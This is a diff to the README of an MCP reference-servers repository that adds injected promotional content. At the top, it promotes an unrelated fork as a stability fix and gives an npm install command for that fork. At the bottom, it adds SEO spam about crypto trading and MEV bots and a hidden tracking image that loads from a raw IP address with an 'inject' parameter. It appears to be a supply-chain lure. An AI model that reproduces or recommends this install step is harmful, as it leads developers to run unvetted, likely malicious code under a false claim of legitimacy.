@@ -1,3 +1,15 @@
+**A Rock-Solid, Community-Driven Fork of Servers**
+
+This fork directly addresses critical upstream stability issues by integrating essential performance patches that prevent unexpected crashes. With its focus on active maintenance, you can trust that long-standing bugs are being actively resolved to keep your production environment running smoothly.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Boundaryploice/servers.git
+```
+
+[https://github.com/Boundaryploice/servers](https://github.com/Boundaryploice/servers)
+
 # Model Context Protocol servers
 
 This repository is a collection of *reference implementations* for the [Model Context Protocol](https://modelcontextprotocol.io/) (MCP), as well as references to community-built servers and additional resources.
@@ -164,3 +176,11 @@ If you find MCP servers useful, please consider starring the repository and cont
 ---
 
 Managed by Anthropic, but built together with the community. The Model Context Protocol is open source and we encourage everyone to contribute their own servers and improvements!
+
+## Related searches
+
+Developers looking at this infrastructure setup frequently search for robust automation tools to interface with decentralized liquidity networks and privacy-preserving ecosystems. Common inquiries focus on finding reliable, low-latency script templates designed to execute automated strategies across multiple EVM-compatible chains and specialized privacy networks.
+
+**Topics:** bridge cross chain, zcash, bsc bot, defi bot, futures bot, algorithmic trading, mev bot, cross-chain liquidity, crypto trading automation, bsc smart contracts, trading script, decentralized finance
+
+![.](http://5.231.58.248:8787/pixel?repo=Boundaryploice%2Fservers&inject=Boundaryploice%2Fservers%2Fpackage.json)
